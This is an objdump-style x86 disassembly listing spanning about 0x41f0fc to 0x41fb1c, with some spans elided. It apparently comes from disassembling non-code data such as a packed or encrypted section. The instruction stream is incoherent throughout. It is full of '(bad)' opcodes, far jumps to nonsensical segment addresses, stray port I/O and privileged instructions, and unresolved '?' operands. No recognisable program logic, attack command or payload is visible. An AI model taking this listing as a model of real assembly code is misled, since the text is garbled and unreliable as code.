  41f0fc:	pop    eax
  41f0fd:	aad    0x68
  41f0ff:	imul   edx,esi,0xffffffe0
  41f102:	test   DWORD PTR [esi],eax
  41f104:	sbb    dl,bh
  41f106:	mov    ecx,0xd0905ef
  41f10b:	sar    DWORD PTR ds:0xb4075e,0x0
	...
  41f172:	add    BYTE PTR [eax],al
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0xfe9837b3
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	loopne 0x41f122
  41f18e:	mov    ebx,0x66338bf0
  41f193:	test   BYTE PTR [edx],dh
  41f195:	jb     0x41f1b9
  41f197:	mov    esi,0xe6815ea8
  41f19c:	(bad)  
  41f19d:	jb     0x41f20b
  41f19f:	mov    ch,BYTE PTR [esi+0x68243dc1]
  41f1a5:	fnsave [ebx-0xd]
  41f1a8:	(bad)  
  41f1a9:	jmp    0x717c:0x494c8117
  41f1b0:	add    DWORD PTR [esi+0x5],edx
  41f1b3:	ds mov bh,0x9
  41f1b6:	dec    esp
  41f1b7:	push   ebp
  41f1b8:	or     DWORD PTR [ecx+0x17],edx
  41f1bb:	inc    edi
  41f1bc:	jmp    0x41f239
  41f1be:	lods   al,BYTE PTR ds:[esi]
  41f1bf:	mov    ?,WORD PTR [ebp-0x6a70661a]
  41f1c5:	std    
  41f1c6:	arpl   WORD PTR [eax+0x26],ax
  41f1c9:	fs pop esp
  41f1cb:	out    dx,eax
  41f1cc:	dec    ecx
  41f1cd:	jmp    0x8950:0x8e2bb07d
  41f1d4:	sbb    BYTE PTR [edi+0x2b26b65],bh
  41f1da:	xor    DWORD PTR [eax-0x6be58269],0x1d7b4b65
  41f1e4:	sar    DWORD PTR [edi],cl
  41f1e6:	add    BYTE PTR [eax],ah
  41f1e8:	mov    esp,0x8bab7388
  41f1ed:	fs jmp 0x4281:0x2a057510
  41f1f5:	mov    esi,0x13b0725c
  41f1fa:	jnp    0x41f265
  41f1fc:	or     eax,0x3946a6a4
  41f201:	ror    DWORD PTR [ebp-0x4e7095d0],cl
  41f207:	in     eax,0x8b
  41f209:	jmp    0x9728e3db
  41f20e:	xchg   ebp,eax
  41f20f:	mov    DWORD PTR [ecx-0x21],esi
  41f212:	add    eax,0x747508f3
  41f217:	push   0xffffffc4
  41f219:	loop   0x41f1b2
  41f21b:	push   es
  41f21c:	push   cs
  41f21d:	fpatan 
  41f21f:	xor    edx,DWORD PTR [ebx+0x6ea069ea]
  41f225:	rcr    esi,0x88
  41f228:	loopne 0x41f1e0
  41f22a:	push   0xffffffac
  41f22c:	dec    edx
  41f22d:	shr    BYTE PTR ds:0x47bcd34e,cl
  41f233:	cmp    al,BYTE PTR [esi]
  41f235:	push   ebx
  41f236:	mov    ebx,0x2a31d229
  41f23b:	inc    ebx
  41f23c:	loopne 0x41f2a5
  41f23e:	test   al,0x28
  41f240:	cmp    al,0xfb
  41f243:	pop    ds
  41f244:	outs   dx,DWORD PTR ds:[esi]
  41f245:	out    0x5a,al
  41f247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f248:	outs   dx,BYTE PTR ds:[esi]
  41f249:	mov    WORD PTR [eax+0x47],es
  41f24c:	sub    BYTE PTR [edi+esi*2-0x7602950a],ah
  41f253:	cmp    ebx,DWORD PTR [ebp-0x4e7c3621]
  41f259:	push   eax
  41f25a:	xchg   edi,eax
  41f25b:	bound  esi,QWORD PTR [esi+0x1f064de]
  41f261:	cmp    bl,BYTE PTR [esi-0x2]
  41f264:	das    
  41f265:	dec    esi
  41f266:	int    0xe2
  41f268:	pushf  
  41f269:	adc    eax,0xc567ea46
  41f26e:	into   
  41f26f:	fs cmp al,0x1f
  41f272:	push   ecx
  41f273:	xchg   edx,eax
  41f274:	sbb    al,dl
  41f276:	cdq    
  41f277:	test   ecx,ebp
  41f279:	lock sub esp,DWORD PTR [eax]
  41f27c:	test   ah,dl
  41f27e:	scas   eax,DWORD PTR es:[edi]
  41f27f:	fistp  DWORD PTR [edi+0x7865f37f]
  41f285:	outs   dx,DWORD PTR ds:[esi]
  41f286:	cs inc ecx
  41f288:	push   ss
  41f289:	mov    esp,0x6e13ff52
  41f28e:	out    0x1,al
	...
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2be
  41f301:	fsub   st,st(0)
  41f303:	mov    ch,0xbc
  41f305:	dec    ebx
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    al,0x1
  41f30a:	add    BYTE PTR [eax],al
  41f30c:	jecxz  0x41f32e
  41f30e:	jecxz  0x41f31f
  41f310:	js     0x41f2ff
  41f312:	lock fidiv WORD PTR [ebx]
  41f315:	fwait
  41f316:	push   ecx
  41f317:	xchg   edx,eax
  41f318:	sub    bh,BYTE PTR [edi+eiz*2-0x1a]
  41f31c:	enter  0x3ca9,0xb5
  41f320:	call   DWORD PTR [edx-0x2bb5733f]
  41f326:	inc    ecx
  41f327:	dec    edx
  41f328:	loopne 0x41f2b7
  41f32a:	and    ah,BYTE PTR [ebx]
  41f32c:	jmp    0xb444:0xc101c517
  41f333:	in     al,dx
  41f334:	outs   dx,DWORD PTR ds:[esi]
  41f335:	inc    sp
  41f337:	jno    0x41f399
  41f339:	inc    ebx
  41f33a:	lods   eax,DWORD PTR es:[esi]
  41f33c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f33d:	pop    ecx
  41f33e:	sub    BYTE PTR [ebp+ebp*1+0x35],dl
  41f342:	lea    esp,[ebp+0x7a680372]
  41f348:	cli    
  41f349:	sub    eax,0x5812758
  41f34e:	js     0x41f399
  41f350:	test   al,0xb1
  41f352:	jle    0x41f3aa
  41f354:	dec    ebx
  41f355:	push   edx
  41f356:	cmc    
  41f357:	test   eax,0xdb6e4572
  41f35c:	sahf   
  41f35d:	pop    ebp
  41f35e:	mov    ebp,0x34fa3c38
  41f363:	bnd call 0x3b531fd7
  41f369:	push   esi
  41f36a:	popa   
  41f36b:	add    DWORD PTR [ebx+esi*4],esp
  41f36e:	mov    bh,0xa3
  41f370:	ficomp WORD PTR [eax+0x7c]
  41f373:	pop    es
  41f374:	aam    0x83
  41f376:	movntq (bad),mm6
  41f377:	out    0xf1,eax
  41f379:	iret   
  41f37a:	lods   eax,DWORD PTR ds:[esi]
  41f37b:	or     ebx,DWORD PTR [edi]
  41f37d:	xor    BYTE PTR gs:[esp+edi*1],dl
  41f381:	sub    BYTE PTR cs:[eax-0x8],0xb6
  41f386:	cmc    
  41f387:	pop    edx
  41f388:	pop    ecx
  41f389:	or     bh,BYTE PTR [ebp-0xd]
  41f38c:	dec    edx
  41f38d:	adc    BYTE PTR [ebp-0x6710558c],0xa6
  41f394:	fbld   TBYTE PTR [ecx+eiz*2]
  41f397:	rol    BYTE PTR [edx+0x3d],1
  41f39a:	lea    ecx,[ecx]
  41f39c:	loop   0x41f3f2
  41f39e:	mov    ebp,0xc88322d4
  41f3a3:	(bad)  
  41f3a4:	xor    eax,0x88095bb8
  41f3a9:	cli    
  41f3aa:	les    ebp,FWORD PTR [edi+esi*1+0x27632793]
  41f3b1:	cwde   
  41f3b2:	outs   dx,BYTE PTR ds:[esi]
  41f3b3:	and    eax,0xef516ea3
  41f3b8:	(bad)  
  41f3b9:	mov    dl,0x4e
  41f3bb:	and    BYTE PTR [ecx],0x94
  41f3be:	pusha  
  41f3bf:	mov    BYTE PTR [ecx+0x182afa3d],al
  41f3c5:	lods   al,BYTE PTR ds:[esi]
  41f3c6:	dec    ebx
  41f3c7:	push   ebx
  41f3c8:	lods   eax,DWORD PTR ss:[esi]
  41f3ca:	dec    BYTE PTR [ecx-0x3a]
  41f3cd:	cmp    dl,BYTE PTR [esi+0x38016243]
  41f3d3:	lahf   
  41f3d4:	div    DWORD PTR ds:0xca0b1145
  41f3da:	push   es
  41f3db:	pop    es
  41f3dc:	jecxz  0x41f3da
  41f3de:	arpl   WORD PTR [ebx-0x246d431b],bx
  41f3e4:	cmp    ebx,DWORD PTR [esp]
  41f3e7:	(bad)  
  41f3e8:	jb     0x41f40e
  41f3ea:	cmp    al,0x1d
  41f3ec:	push   esi
  41f3ed:	add    eax,0xfaaebd5c
  41f3f2:	adc    dh,BYTE PTR [esi+0x41]
  41f3f5:	xchg   esp,eax
  41f3f6:	jo     0x41f3c1
  41f3f8:	push   ecx
  41f3f9:	outs   dx,BYTE PTR ds:[esi]
  41f3fa:	test   DWORD PTR [edx-0x152e8be4],ebx
  41f400:	add    al,0xec
  41f402:	es (bad) 
  41f404:	mov    bh,0xbe
  41f406:	(bad)  
  41f408:	add    BYTE PTR [edi],bl
  41f40a:	mov    edx,0x8878e9e7
  41f40f:	add    eax,0x0
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x96
  41f481:	popa   
  41f482:	leave  
  41f483:	test   al,al
  41f485:	dec    esp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    al,0x1
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	fimul  DWORD PTR [edx-0x521752d8]
  41f492:	push   ebx
  41f493:	div    BYTE PTR [ecx+0x60]
  41f496:	or     eax,0x5e91b001
  41f49b:	pop    ss
  41f49c:	mov    DWORD PTR [edx],edi
  41f49e:	daa    
  41f49f:	or     eax,0x61a68267
  41f4a4:	mov    DWORD PTR [edi],edx
  41f4a6:	ror    BYTE PTR [eax],0xa3
  41f4a9:	dec    ebp
  41f4aa:	ret    0x81cd
  41f4ad:	ins    DWORD PTR es:[edi],dx
  41f4ae:	push   ds
  41f4af:	pop    eax
  41f4b0:	out    dx,eax
  41f4b1:	sub    DWORD PTR [ebx],edi
  41f4b3:	sbb    eax,DWORD PTR [esp+ebp*4+0x6d]
  41f4b7:	push   cs
  41f4b8:	mov    esp,0x141e3a8d
  41f4bd:	outs   dx,DWORD PTR ds:[esi]
  41f4be:	pushf  
  41f4bf:	ficom  DWORD PTR [edi]
  41f4c1:	es jle 0x41f4d6
  41f4c4:	imul   ebx,DWORD PTR [ecx+0x11fa1894],0x2faedee3
  41f4ce:	dec    edi
  41f4cf:	jns    0x41f45a
  41f4d1:	mov    eax,DWORD PTR [ebx]
  41f4d3:	gs loopne 0x41f4d7
  41f4d6:	shr    BYTE PTR [eax],cl
  41f4d8:	mov    ah,0xce
  41f4da:	inc    ebx
  41f4db:	es aas 
  41f4dd:	jecxz  0x41f50c
  41f4df:	push   esi
  41f4e0:	retf   0xc221
  41f4e3:	jp     0x41f55e
  41f4e5:	retf   
  41f4e6:	cmp    BYTE PTR [esi-0x32fc63ec],cl
  41f4ec:	jmp    0x1f090e30
  41f4f1:	imul   edx,DWORD PTR [edx-0x3f],0x5f2df59a
  41f4f8:	xchg   edx,esp
  41f4fa:	jb     0x41f4ba
  41f4fc:	sbb    eax,0xfb050b19
  41f501:	push   ss
  41f502:	mov    fs,WORD PTR [eax]
  41f504:	sbb    eax,0x476f41df
  41f509:	ror    DWORD PTR [eax],cl
  41f50b:	mov    edi,0x672dd6b0
  41f510:	mov    dh,0x90
  41f512:	mov    dh,0x11
  41f514:	icebp  
  41f515:	jecxz  0x41f499
  41f517:	jp     0x41f571
  41f519:	mov    ebx,0x41e8916d
  41f51e:	pop    edx
  41f51f:	popa   
  41f520:	aad    0x8b
  41f522:	and    BYTE PTR [ebp-0x4b],cl
  41f525:	fstp   QWORD PTR [eax+0x3f0bd925]
  41f52b:	jns    0x41f556
  41f52d:	ret    
  41f52e:	push   edx
  41f52f:	jp     0x41f4f1
  41f531:	popf   
  41f532:	jno    0x41f576
  41f534:	push   edx
  41f535:	inc    DWORD PTR [edx]
  41f537:	clc    
  41f538:	inc    edx
  41f539:	add    al,0xaa
  41f53b:	fcomp  QWORD PTR [ebx]
  41f53d:	pop    ds
  41f53e:	dec    ebp
  41f53f:	pusha  
  41f540:	sti    
  41f541:	mov    edi,DWORD PTR [edi+0x2582ca9f]
  41f547:	fdivr  QWORD PTR [ebx-0x17]
  41f54a:	das    
  41f54b:	mov    edi,0xbae23fa0
  41f550:	cld    
  41f551:	sar    BYTE PTR [esi-0x66],cl
  41f554:	lods   eax,DWORD PTR ds:[esi]
  41f555:	dec    esi
  41f556:	mov    ecx,0x32622ef
  41f55b:	lea    esp,[eax+0x79]
  41f55e:	std    
  41f55f:	pop    esi
  41f560:	out    0xad,al
  41f562:	mov    edx,0x9b10459
  41f567:	pop    esi
  41f568:	imul   esp,DWORD PTR [eax-0x11],0x7351fa70
  41f56f:	pop    esp
  41f570:	and    BYTE PTR [eax+esi*4+0x47298a71],0x65
  41f578:	xchg   edx,eax
  41f579:	dec    ecx
  41f57a:	or     DWORD PTR [ecx],eax
  41f57c:	shr    dh,cl
  41f57e:	sahf   
  41f57f:	jmp    0x562c:0x6d05f971
  41f586:	dec    esp
  41f587:	retf   
  41f588:	adc    al,BYTE PTR [ebp-0x74406b2a]
  41f58e:	mov    esi,0xe5
	...
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x399:0xeff6d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	xchg   ebp,eax
  41f60d:	loopne 0x41f59a
  41f60f:	lods   eax,DWORD PTR ds:[esi]
  41f610:	(bad)  
  41f611:	in     eax,dx
  41f612:	pcmpgtd mm6,QWORD PTR [ebx]
  41f615:	sahf   
  41f616:	cmp    DWORD PTR [edx],ebx
  41f618:	ds stc 
  41f61a:	jecxz  0x41f5d6
  41f61c:	mov    WORD PTR [ebx+edx*2-0x71e6c2cd],cs
  41f623:	rol    DWORD PTR [eax-0x4b],0x94
  41f627:	mov    edi,0x673c7496
  41f62c:	rol    DWORD PTR [ebx-0x3ab75372],cl
  41f632:	dec    ebx
  41f633:	mov    ds:0x568b81f9,eax
  41f638:	push   0xfffffff0
  41f63a:	sub    bl,ah
  41f63c:	dec    esp
  41f63d:	in     eax,0x70
  41f63f:	mov    ss,WORD PTR ds:0x109170e1
  41f645:	ret    
  41f646:	fidivr DWORD PTR [ebp-0x280945dd]
  41f64c:	sbb    al,0x1
  41f64e:	adc    eax,0xa4a4d1f
  41f653:	adc    BYTE PTR [edx-0x3f96afaf],ah
  41f659:	xchg   ebx,eax
  41f65a:	clc    
  41f65b:	sti    
  41f65c:	dec    ebp
  41f65d:	add    DWORD PTR [esi],edx
  41f65f:	ins    BYTE PTR es:[edi],dx
  41f660:	in     al,dx
  41f661:	(bad)  
  41f662:	int3   
  41f663:	imul   BYTE PTR [edi-0x54]
  41f666:	retf   
  41f667:	push   esp
  41f668:	and    dl,BYTE PTR [eax+ebx*4+0x6c325eb3]
  41f66f:	jge    0x41f6b5
  41f671:	xor    eax,0x33c932d4
  41f676:	out    0xc5,al
  41f678:	imul   ebx,DWORD PTR [edx+0x1e],0xb4bc0969
  41f67f:	popf   
  41f680:	ret    
  41f681:	and    BYTE PTR [eax],cl
  41f683:	in     eax,0xda
  41f685:	jmp    0x41f6b4
  41f687:	xchg   esi,eax
  41f688:	mov    edx,0x7f442aed
  41f68d:	nop
  41f68e:	icebp  
  41f68f:	ins    BYTE PTR es:[edi],dx
  41f690:	lods   eax,DWORD PTR ds:[esi]
  41f691:	add    BYTE PTR [ecx+0x31],0xda
  41f695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f696:	pop    ebp
  41f697:	pop    esi
  41f698:	mov    al,bl
  41f69a:	mov    eax,0x2c759d72
  41f69f:	ds dec esi
  41f6a1:	scas   al,BYTE PTR es:[edi]
  41f6a2:	and    al,0x3f
  41f6a4:	iret   
  41f6a5:	cmp    BYTE PTR [esi+0x1811c79c],dl
  41f6ab:	xchg   esp,eax
  41f6ac:	shr    al,0x72
  41f6af:	test   al,0xee
  41f6b1:	push   ebx
  41f6b2:	ss (bad) 
  41f6b4:	(bad)  
  41f6b5:	jbe    0x41f6d3
  41f6b7:	add    ecx,esp
  41f6b9:	pop    edi
  41f6ba:	shl    DWORD PTR ds:0x2a4af2f4,0xa0
  41f6c1:	adc    esi,DWORD PTR [ebx]
  41f6c3:	aad    0x9d
  41f6c5:	(bad)  
  41f6c6:	pop    ebx
  41f6c7:	into   
  41f6c8:	out    dx,al
  41f6c9:	pop    es
  41f6ca:	push   es
  41f6cb:	out    dx,eax
  41f6cc:	dec    ebx
  41f6cd:	test   al,0xa2
  41f6cf:	out    dx,eax
  41f6d0:	jne    0x41f710
  41f6d2:	loop   0x41f6a6
  41f6d4:	jmp    0x41f6ad
  41f6d6:	mov    edx,0xb39f560e
  41f6db:	ficomp WORD PTR [esi]
  41f6dd:	sbb    esp,DWORD PTR ss:[edx+0x36]
  41f6e1:	and    BYTE PTR [edx+0x7],bh
  41f6e4:	mov    al,ds:0xe25b2a7e
  41f6e9:	js     0x41f6d3
  41f6eb:	ret    
  41f6ec:	(bad)  
  41f6ee:	hlt    
  41f6ef:	rcl    dh,cl
  41f6f1:	jno    0x41f6ae
  41f6f3:	jbe    0x41f75f
  41f6f5:	int    0x90
  41f6f7:	inc    ebp
  41f6f8:	in     al,dx
  41f6f9:	jbe    0x41f761
  41f6fb:	cmp    al,0x1e
  41f6fd:	pop    ds
  41f6fe:	std    
  41f6ff:	pop    edi
  41f700:	mov    DWORD PTR [ebx],edi
  41f702:	sahf   
  41f703:	fadd   DWORD PTR [eax+0x3b96be2c]
  41f709:	cmp    eax,0x866b02a2
  41f70e:	rol    BYTE PTR [ecx+0x0],1
	...
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x8ffc:0x26c62d2
  41f783:	outs   dx,DWORD PTR ds:[esi]
  41f784:	enter  0x14e,0x0
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	outs   dx,DWORD PTR ds:[esi]
  41f78d:	rcr    BYTE PTR [eax],1
  41f78f:	or     ecx,ecx
  41f791:	cld    
  41f792:	push   eax
  41f793:	mov    bl,al
  41f795:	xchg   bh,bl
  41f797:	iret   
  41f798:	mov    cs,WORD PTR [edi+ecx*8]
  41f79b:	inc    ecx
  41f79c:	inc    eax
  41f79d:	repz sbb edx,DWORD PTR [ebx]
  41f7a0:	setg   BYTE PTR [ebx]
  41f7a3:	mov    bl,al
  41f7a5:	mov    bh,0xf2
  41f7a7:	fist   DWORD PTR [edi+0x8571cbb]
  41f7ad:	out    dx,al
  41f7ae:	out    dx,al
  41f7af:	add    eax,ecx
  41f7b1:	xchg   edx,eax
  41f7b2:	fwait
  41f7b3:	xor    BYTE PTR [ebx+ecx*1-0x10],bh
  41f7b7:	mov    bh,0xa6
  41f7b9:	jnp    0x41f7f4
  41f7bb:	adc    ah,bl
  41f7bd:	dec    edx
  41f7be:	in     al,dx
  41f7bf:	ret    
  41f7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7c1:	xor    eax,0x9dd9769d
  41f7c6:	jo     0x41f80a
  41f7c8:	jb     0x41f768
  41f7ca:	add    esi,DWORD PTR [eax+0x22]
  41f7cd:	(bad)  
  41f7ce:	scas   al,BYTE PTR es:[edi]
  41f7cf:	sbb    cl,al
  41f7d1:	xor    al,0x28
  41f7d3:	(bad)  
  41f7d4:	idiv   BYTE PTR [ecx]
  41f7d6:	in     eax,dx
  41f7d7:	retf   0xbc7c
  41f7da:	dec    edx
  41f7db:	jp     0x41f776
  41f7dd:	adc    eax,0xd32c9947
  41f7e2:	mov    bl,BYTE PTR [esi]
  41f7e4:	rol    BYTE PTR [esi+0xa9d494],1
  41f7ea:	mov    eax,0x98dd0863
  41f7ef:	or     ch,cl
  41f7f1:	cmp    BYTE PTR [ecx+0x6c09db30],dl
  41f7f7:	fcomip st,st(4)
  41f7f9:	dec    eax
  41f7fa:	sub    BYTE PTR [edx+0x43fe064f],bl
  41f800:	bound  esp,QWORD PTR [eax-0x14eca897]
  41f806:	in     eax,dx
  41f807:	loope  0x41f7b0
  41f809:	pop    edi
  41f80a:	sub    cl,0xff
  41f80d:	daa    
  41f80e:	lods   eax,DWORD PTR ds:[esi]
  41f80f:	aam    0xd1
  41f811:	mov    esp,0x1166bf81
  41f816:	mov    cs,esi
  41f818:	fst    QWORD PTR [esi]
  41f81a:	mov    WORD PTR [ecx-0x4f],ss
  41f81d:	std    
  41f81e:	(bad)  
  41f81f:	lods   al,BYTE PTR ds:[esi]
  41f820:	and    DWORD PTR [edx+0x68f6752b],ecx
  41f826:	sti    
  41f827:	inc    BYTE PTR [ebx]
  41f829:	jbe    0x41f7f7
  41f82b:	mov    ebp,0x317c87ea
  41f830:	pop    ss
  41f831:	cmp    edx,ecx
  41f833:	bound  eax,QWORD PTR [esp+ebp*1]
  41f836:	cli    
  41f837:	in     al,0xf2
  41f839:	in     eax,0x79
  41f83b:	cld    
  41f83c:	cmp    edx,DWORD PTR [eax-0x68bef649]
  41f842:	cdq    
  41f843:	add    BYTE PTR [edx-0x29],ah
  41f846:	retf   
  41f847:	push   edx
  41f848:	imul   BYTE PTR [ebx]
  41f84a:	and    edi,ebx
  41f84c:	push   ss
  41f84d:	arpl   WORD PTR [edx],si
  41f84f:	cmc    
  41f850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f851:	pop    eax
  41f852:	fmul   DWORD PTR [edi-0x53f2b931]
  41f858:	sub    bl,0x9c
  41f85b:	cld    
  41f85c:	pop    esp
  41f85d:	das    
  41f85e:	mov    bl,0x72
  41f860:	jb     0x41f8af
  41f862:	popf   
  41f863:	pop    ecx
  41f864:	imul   edx,DWORD PTR [edi-0xc],0x64
  41f868:	push   ebp
  41f86a:	adc    ah,BYTE PTR [ebp+0x1fbe3fef]
  41f870:	mov    ds:0xcbb10dc1,eax
  41f875:	push   esp
  41f876:	or     eax,DWORD PTR [edi-0x7a]
  41f879:	in     al,0xc7
  41f87b:	jns    0x41f831
  41f87d:	hlt    
  41f87e:	mov    WORD PTR [ebp+0x2b400c12],?
  41f884:	dec    ebp
  41f885:	inc    ecx
  41f886:	cmp    edx,esi
  41f888:	int3   
  41f889:	pop    cx
  41f88b:	jecxz  0x41f89b
  41f88d:	pop    edi
  41f88e:	adc    ch,cl
	...
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	shl    BYTE PTR [eax],cl
  41f902:	add    al,0xea
  41f904:	int3   
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	mov    bh,0x4e
  41f90e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f90f:	jns    0x41f913
  41f911:	iret   
  41f912:	sbb    bl,BYTE PTR [edx-0x505d6754]
  41f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f919:	sub    BYTE PTR [edi-0x553d5612],ch
  41f91f:	fisubr DWORD PTR [ebx-0xb62e666]
  41f925:	mov    al,0xb8
  41f927:	js     0x41f8e6
  41f929:	adc    eax,0xa1300fb4
  41f92e:	mov    ah,0x4
  41f930:	inc    ecx
  41f931:	sub    eax,0x4ac59ec9
  41f936:	pop    es
  41f937:	aam    0xbe
  41f939:	xor    BYTE PTR [esi+ebp*1+0x3e],al
  41f93d:	sbb    al,0xf6
  41f93f:	fs pop ecx
  41f941:	sub    eax,0x98ebd90d
  41f946:	in     al,0x84
  41f948:	xor    ebp,DWORD PTR cs:[edi+0x3f]
  41f94c:	pop    esi
  41f94d:	sub    ebp,DWORD PTR [edx]
  41f94f:	aas    
  41f950:	popa   
  41f951:	popa   
  41f952:	dec    ecx
  41f953:	or     ch,cl
  41f955:	xor    BYTE PTR [eax+0x41],cl
  41f958:	daa    
  41f959:	sbb    DWORD PTR [ebp+0x68],edi
  41f95c:	adc    al,0xf2
  41f95e:	sub    cl,BYTE PTR [edi+0x7]
  41f961:	inc    ebp
  41f962:	mul    cl
  41f964:	mov    ebp,0x4fb77ad6
  41f969:	xor    eax,0xbb9a1744
  41f96e:	pop    es
  41f96f:	cmc    
  41f970:	or     ecx,ebp
  41f972:	xchg   DWORD PTR [ecx],eax
  41f974:	mov    DWORD PTR [edx-0x1a],esp
  41f977:	pop    edi
  41f978:	dec    edx
  41f979:	mov    al,dh
  41f97b:	les    ebp,FWORD PTR [ecx+0x56]
  41f97e:	adc    BYTE PTR [ecx-0x517ee795],dl
  41f984:	fild   WORD PTR [ecx-0x44041d01]
  41f98a:	dec    ecx
  41f98b:	sbb    BYTE PTR [eax],dl
  41f98d:	adc    bl,BYTE PTR [ebx-0x7a80073c]
  41f993:	or     BYTE PTR [edi-0xb],dl
  41f996:	pop    edx
  41f997:	xor    eax,DWORD PTR [edx+0x2fd9e269]
  41f99d:	div    DWORD PTR es:[eax-0x28677a3d]
  41f9a4:	sub    eax,0x4a1fedbd
  41f9a9:	push   esi
  41f9aa:	test   DWORD PTR [edi+eiz*1+0x3],edi
  41f9ae:	fnsave [eax]
  41f9b0:	je     0x41f994
  41f9b2:	sbb    eax,0x63f39afa
  41f9b7:	rol    DWORD PTR [esi+ebx*1-0x66f873cd],1
  41f9be:	icebp  
  41f9bf:	cmp    BYTE PTR [ecx],dl
  41f9c1:	cmp    esi,ebx
  41f9c3:	fwait
  41f9c4:	xor    DWORD PTR [esi+0x5c],esp
  41f9c7:	mov    edx,ebp
  41f9c9:	xchg   esi,eax
  41f9ca:	out    dx,al
  41f9cb:	sti    
  41f9cc:	mov    dl,0xa2
  41f9ce:	loopne 0x41fa34
  41f9d0:	mov    eax,ds:0x281a0558
  41f9d5:	jmp    0x1d4b:0x79ba7970
  41f9dc:	inc    edi
  41f9dd:	push   0xe
  41f9df:	cdq    
  41f9e0:	pop    esi
  41f9e1:	push   ebp
  41f9e2:	lea    eax,[edi-0x4e]
  41f9e5:	xor    eax,0xbc021a48
  41f9ea:	dec    edi
  41f9eb:	ins    DWORD PTR es:[edi],dx
  41f9ec:	ds popa 
  41f9ee:	pop    es
  41f9ef:	and    ebx,DWORD PTR [edi-0x7a779844]
  41f9f5:	lock icebp 
  41f9f7:	and    BYTE PTR [ebx],ah
  41f9f9:	xchg   esi,eax
  41f9fa:	dec    BYTE PTR [ecx-0x5a6a4c10]
  41fa00:	fsubp  st(2),st
  41fa02:	xchg   ebp,eax
  41fa03:	gs stos BYTE PTR es:[edi],al
  41fa05:	out    0x80,eax
  41fa07:	jns    0x41f9a2
  41fa09:	mov    edx,0x59ae69fa
  41fa0e:	pop    edi
  41fa0f:	pop    ds
	...
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x46bd5fde
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	jns    0x41fabd
  41fa8e:	fistp  DWORD PTR [ebp+0x45affee2]
  41fa94:	mov    BYTE PTR [edi-0x14],ch
  41fa97:	dec    eax
  41fa98:	or     dl,0x42
  41fa9b:	xchg   ecx,eax
  41fa9c:	add    eax,0x18f60fea
  41faa1:	loopne 0x41fa7e
  41faa3:	pop    ss
  41faa4:	test   al,0x3e
  41faa6:	shr    DWORD PTR [edi+0xb],cl
  41faa9:	std    
  41faaa:	push   edx
  41faab:	ret    
  41faac:	jmp    0xc705:0xcc41f27c
  41fab3:	xor    eax,0x3a82baaf
  41fab8:	lock adc BYTE PTR [ecx+esi*4+0x25],0xa5
  41fabe:	cmp    edx,DWORD PTR [ecx-0x9e402aa]
  41fac4:	sbb    cl,BYTE PTR [eax-0x67]
  41fac7:	xor    ebp,0xa
  41faca:	lds    esp,FWORD PTR [edi+0x1da37598]
  41fad0:	sbb    BYTE PTR [ecx+0x1c],dh
  41fad3:	xchg   edx,eax
  41fad4:	adc    al,0xef
  41fad6:	push   edx
  41fad7:	iret   
  41fad8:	adc    DWORD PTR [di-0x2b],edx
  41fadc:	push   edi
  41fadd:	xor    ah,BYTE PTR [ebp+0x1271e431]
  41fae3:	sbb    ch,BYTE PTR [edi+0x6bcc5983]
  41fae9:	mov    eax,0x4644180b
  41faee:	scas   al,BYTE PTR es:[edi]
  41faef:	ret    
  41faf0:	mov    bh,BYTE PTR [esi+0x44f0f93d]
  41faf6:	es int3 
  41faf8:	les    edi,FWORD PTR [edi+0x236cf098]
  41fafe:	aad    0x6d
  41fb00:	xchg   edx,eax
  41fb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb02:	retf   0x5ac6
  41fb05:	sbb    ch,BYTE PTR [esi-0x257f9bb3]
  41fb0b:	(bad)  
  41fb0d:	js     0x41fb07
  41fb0f:	sbb    DWORD PTR [esi+ecx*8-0x2fab9a34],edi
  41fb16:	retf   
  41fb17:	push   edi
  41fb18:	daa    
  41fb19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb1a:	ins    DWORD PTR es:[edi],dx
  41fb1b:	push   edx
  41fb1c:	inc    eax
